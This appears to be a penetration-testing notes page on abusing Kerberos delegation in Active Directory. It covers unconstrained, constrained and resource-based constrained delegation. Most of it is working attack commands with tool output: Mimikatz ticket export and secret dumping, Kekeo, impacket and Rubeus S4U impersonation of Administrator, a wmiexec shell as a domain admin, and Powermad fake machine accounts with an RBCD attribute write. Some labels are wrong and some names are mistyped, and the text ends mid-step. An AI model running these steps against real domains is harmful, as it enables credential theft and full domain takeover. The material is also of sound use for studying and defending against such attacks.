The practical use of Kerberos Delegation is to enable an application to access resources hosted on a different server. An example of this would be a web server that needs to access a SQL database hosted on the database server for the web application that it is hosting.

**types:**

**First: Unconstrained Kerberos Delegation**<br>
----

When a user authenticates to a computer that has unresitricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. The reason TGTs get cached in memory is so the computer (with delegation rights) can impersonate the authenticated user as and when required for accessing any other services on that user's behalf.
```
# List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
# Export tickets with Mimikatz
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way
```
Then use **Pass the Hash attack** using ```Mimikatz``` to inject it into current our session :
```
mimikatz # kerberos::ptt <TheTicketPass>
mimikatz # exit
Bye!
.\PsExec.exe -accepteula \\machine.domain.local cmd
```

**Second: Constrained Kerberos Delegation**
----

Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. Once the client logged in to the delegated service 1, the service 1 ask the KDC to provide S4U2self (simillar to TGT) and S4U2proxy (simillar to TGS) using the TGT of the client. An example of this would be if we were able to compromise an AD account that had constrained delegation configured. By knowing the plaintext password or even just the NTLM hash of this account, we could generate a TGT for this account, then use the TGT to execute a ```S4U``` request for any non-sensitive user account in order to access the service as that user.
 
The following are examples of services that can be configured for delegation:
```
HTTP - Used for web applications to allow pass-through authentication using AD credentials.
WSMAN - It's utilized by PowerShell's remoting feature, allowing administrators to execute commands and scripts on remote computers.
CIFS - Common Internet File System is used for file sharing that allows delegation of users to shares.
LDAP - Used to delegate to the LDAP service for actions such as resetting a user's password.
HOST - Allows delegation of account for all activities on the host.
MSSQL - Allows delegation of user accounts to the SQL service for pass-through authentication to databases.
```
**Constrained Delegation Exploitation**
The first thing we need to do is enumerate available delegations usint ```PowerView``` tool.
```
PS C:\>Import-Module C:\Tools\PowerView.ps1 
PS C:\>Get-NetUser -TrustedToAuth
```
After this recon we should to dump the clear text passwords from registry hive file hopping to find the delegated account password. <br>
We could do this using ```Mimikatz``` tools:
```
# token::elevate    -> is used to impersonate a token with higher privileges
# lsadump::secrets    -> dump clear text passwords
```
Now it's time to use ```Kekeo``` tool to generate our tickets and then use Mimikatz to load those tickets into memory. Let's start by generating the tickets:
```
# tgt::ask /user:<DelegatedAccountUserName> /domain:<DomainName> /password:<DelegatedAccountPassword>
```
This command used to make a TGT associated to the delegated account to make sure this account authenticated in the AD environment.<br>
Now that we have the TGT for the account that can perform delegation, we can forge TGS requests for the account we want to impersonate.
```
# tgs::s4u /tgt:<TheTGTOfTheDelegatedUser> /user:<TheAdministrativeAccountWeWantToImpersonate> /service:<ServiceName>/Machine.Domain.local
```

TheAdministrativeAccountWeWantToImpersonate ->  might be retrived from the enumeration. If we couldn't that we will use the "administrator" if it's enabled.
**Finally:** we use **mimikatz** to pass the ticket and inject it into our current session.
we should make new window of mimikatz to do that.
```
# privilege::debug
# kerberos::ptt <TGTfile> 
```
Now that the tickets are imported, we can finally create our PSSession on the target machine that the delegated account has delegation on.

```
mimikatz # exit
Bye!
PS C:> New-PSSession -ComputerName <TargetMachine.DomainName.local>
PS C:\> Enter-PSSession -ComputerName <TargetMachine.DomainName.local>
```
Another method for Constrained Kerberos Delegation
---

![Screenshot from 2024-09-22 21-51-42](https://github.com/user-attachments/assets/14cc179f-c7d0-41ab-baca-603a4e40af7b)

as we can see our user (DARLA_WINTERS) is allowed to delegate to several services, This means we can impersonate Administrator for the **CIFS** service on the Domain Controller (haystack.thm.corp).


Using impacket’s ```getST.py``` for this.
```
$ getST.py -spn "cifs/haystack.thm.corp" -impersonate "Administrator" "thm.corp/DARLA_WINTERS:Password123"
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

**Getting a shell**

Setting the ccache using the ```KRB5CCNAME``` environment variable.
	
```
export KRB5CCNAME=Administrator.ccache
```
Now we can use ```wmiexec.py``` with Kerberos authentication to get a shell as Administrator.
	
```
$ wmiexec.py -k -no-pass Administrator@haystack.thm.corp
Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
thm\administrator
```

**Third: Resource-Based Constrained Delegation**
----


>How Resource-Based Constrained Delegation Works

RBCD utilizes Active Directory’s security principal objects, such as user accounts, computer accounts, and service accounts, to define the delegation rules. Each security principal can have a set of resources associated with it, determining the resources to which it can delegate its credentials.

When a user or service account attempts to access a resource, the resource’s access control settings determine whether delegation is allowed and which security principals are permitted to delegate their credentials to access the resource. These settings are configured using Active Directory’s access control lists (ACLs).

>Overview of an Attack

To comprehend the attack flow of the RBCD, follow the steps listed below:

1- The attacker is able to add computers to the domain after gaining access to a domain user account. Domain users often belong by default to the Authenticated Users group, which enables users to join up to 10 machines to the domain. (Keep in mind, though, that this isn’t always the case; occasionally, administrators will change the ms-ds-machineaccountquota property to 0 to thwart these attacks.)<br>
2- The attacker needs write access to the targeted computer from the compromised user or a group to which the user belongs. GenericAll, GenericWrite, and WriteDACL are the three write permissions.<br>
3- The attacker modifies the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on the targeted computer with specify a service account they control.<br>
4- The attacker requests a service ticket impersonating a high privileged user, such as a domain admin, to access the target computer.<br>
5- The attacker uses the issued ticket to access the target computer.



>Let’s start enumaration

Let’s check if users are permitted to do so as the attack would include adding a new computer object to the domain. By default, a domain member can typically add up to 10 computers to the domain. We can query the root domain object and look for property to verify this. ```ms-ds-machineaccountquota```
```
Get-ADObject -Identity (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota | Select-Object -ExpandProperty 'ms-DS-MachineAccountQuota'
```
>The ms-DS-MachineAccountQuota attribute is a domain-wide setting that applies to all users in the domain, not to individual users like osama. This attribute controls how many computer accounts any non-admin user can create in the domain.

Next, we create a new fake computer object with PowerMad, then verify that it is added correctly to the domain
```
Import-Module .\Powermad.ps1

New-MachineAccount -MachineAccount fakeone -Password $(ConvertTo-SecureString ‘Password123!’ -AsPlainText -Force) -verbose

Get-DomainComputer faceone
```
Now, we assign the delegation privilege to add our FakeComputer to the DC machine trusted list:

```
$sid = Get-DomainComputer -Identity mycomputer -Properties objectsid  | Select -ExpandProperty objectsid
$SDDL = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;{0})" -f $sid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $SDDL
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```
Then
```
Get-DomainComputer <target coputer have the service we will impersonate using the admin> | Set-DomainObject -Set @{‘msds-allowedtoactonbehalfofotheridentity’=$SDBytes} -Verbose
```

Let’s generate the RC4 hash of the password we set for the ```fakeone``` computer:
```
.\Rubeus.exe hash /password:Password123!
```


**Impersonation**

Once we have the hash, we can now attempt to execute the attack by requesting a kerberos ticket for fakecomputer$ with ability to impersonate user Administrtor who is a Domain Admin
```
.\Rubeus.exe s4u /user:fakeone /rc4:<hash of the fakeone> /impersonateuser:administrator /msdsspn:cifs/<target coputer have the service we will impersonate using the admin>.test.local /domain:test.local /ptt
```

Finally, the ticket was injected.

<br>
This ticket should give us access to the fakeone machine (fakeone.test.local) as an administrator. However, attempting to list the C$ directory on the DC
```
dir \\fakeone.test.local\c$
```




